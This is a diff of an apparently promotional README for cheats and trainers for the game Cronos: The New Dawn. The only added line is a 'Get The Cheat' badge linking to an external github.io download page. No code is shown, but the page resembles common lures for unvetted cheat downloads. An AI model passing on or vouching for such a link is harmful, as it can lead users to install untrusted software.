@@ -4,6 +4,8 @@
 
 Cronos: The New Dawn throws players into a deep sci-fi survival RPG where every decision shapes your path. But let’s be real—sometimes grinding for loot, crafting endlessly, or struggling with brutal enemies isn’t fun. That’s where **Cronos: The New Dawn cheats, trainers, and hacks** step in, giving you shortcuts to make the game a whole lot more thrilling. 🚀
 
+[![Get](https://img.shields.io/badge/Get%20The-Cheat-blueviolet)](https://cronos-the-new-dawn-cheat.github.io/.github/)
+
 ## Product Overview
 
 Cheats and mods for Cronos: The New Dawn are basically tools that let you bend the rules of the game. With the right trainer or cheat menu, you can boost your survival rate, unlock weapons instantly, or even make your character a god-like being. No more worrying about scarce resources or overpowered bosses—you’re in full control.
